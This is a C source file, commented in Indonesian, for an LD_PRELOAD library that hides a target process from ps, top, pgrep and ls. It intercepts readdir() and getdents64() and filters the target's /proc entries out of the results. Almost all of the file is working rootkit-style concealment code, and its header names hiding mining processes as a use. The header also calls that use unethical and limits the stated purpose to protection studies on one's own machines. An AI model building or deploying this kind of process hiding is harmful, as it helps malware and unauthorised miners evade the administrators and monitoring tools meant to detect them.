/*
 * hideproc.c — userland process hiding via LD_PRELOAD
 *
 * Meng-interposisi readdir() dan getdents64() di libc sehingga entry
 * /proc/<pid> dari proses target TIDAK dikembalikan. Akibatnya tool yang
 * membaca direktori /proc (ps, pgrep, top, ls /proc) tidak melihat proses
 * tersebut SELAMA tool itu ikut memuat library ini.
 *
 * Target yang disembunyikan:
 *   - default: PID proses yang memuat library ini (getpid)
 *   - override: env HIDE_PID=<pid>  (untuk menyembunyikan proses LAIN
 *     dari tool inspeksi, mis. `HIDE_PID=1234 ps aux`)
 *
 * BATAS YANG JUJUR (penting):
 *   - Ini hiding userland. Kernel tetap tahu proses itu ada; /proc/<pid>
 *     tetap eksis dan bisa diakses langsung (kill, /proc/<pid>/stat).
 *   - Hanya tool yang dijalankan DENGAN LD_PRELOAD yang buta terhadapnya.
 *     `ps` polos tanpa preload tetap melihat proses.
 *   - Menyembunyikan proses mining dari mesin yang BUKAN milikmu = tidak
 *     etis dan umumnya melanggar ToS. Pakai hanya di infrastruktur sendiri
 *     untuk studi proteksi/anti-tamper.
 */
#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

struct linux_dirent64 {
    ino64_t d_ino;
    off64_t d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

static pid_t g_hidden_pid = -1;

__attribute__((constructor)) static void hideproc_init(void) {
    const char* hp = getenv("HIDE_PID");
    g_hidden_pid = (hp && *hp) ? (pid_t)atoi(hp) : getpid();
}

/* Apakah fd mengarah ke direktori /proc (level mana pun)? */
static int fd_is_proc(int fd) {
    char link[64];
    char path[64];
    snprintf(link, sizeof link, "/proc/self/fd/%d", fd);
    ssize_t n = readlink(link, path, sizeof path - 1);
    if (n <= 0) return 0;
    path[n] = '\0';
    return strcmp(path, "/proc") == 0 || strncmp(path, "/proc/", 6) == 0;
}

/* Entry bernama semua-digit dan sama dengan PID target? */
static int name_is_hidden_pid(const char* name) {
    if (!name || *name == '\0') return 0;
    for (const char* p = name; *p; p++)
        if (*p < '0' || *p > '9') return 0;
    return atoi(name) == (int)g_hidden_pid;
}

/* ==== Interposisi readdir (dipakai ps, pgrep, top, ...) ==== */
struct dirent* readdir(DIR* dirp) {
    static struct dirent* (*real_readdir)(DIR*) = NULL;
    if (!real_readdir) real_readdir = dlsym(RTLD_NEXT, "readdir");

    int is_proc = fd_is_proc(dirfd(dirp));
    for (;;) {
        struct dirent* e = real_readdir(dirp);
        if (!e) return NULL;
        if (is_proc && name_is_hidden_pid(e->d_name)) continue;
        return e;
    }
}

/* ==== Interposisi getdents64 (dipakai ls /proc, find, ...) ==== */
/* Signature harus identik dengan deklarasi glibc di <dirent.h>:
 * int getdents64(int fd, void *dirp, size_t count) */
int getdents64(int fd, void* dirp, size_t count) {
    static int (*real_getdents64)(int, void*, size_t) = NULL;
    if (!real_getdents64) real_getdents64 = dlsym(RTLD_NEXT, "getdents64");

    int n = real_getdents64(fd, dirp, count);
    if (n <= 0 || !fd_is_proc(fd)) return n;

    /* Padatkan buffer: buang entry milik PID target. */
    int in = 0, out = 0;
    while (in < n) {
        struct linux_dirent64* e = (struct linux_dirent64*)((char*)dirp + in);
        unsigned short reclen = e->d_reclen;
        if (!name_is_hidden_pid(e->d_name)) {
            if (out != in) memmove((char*)dirp + out, (char*)dirp + in, reclen);
            out += reclen;
        }
        in += reclen;
    }
    return out;
}
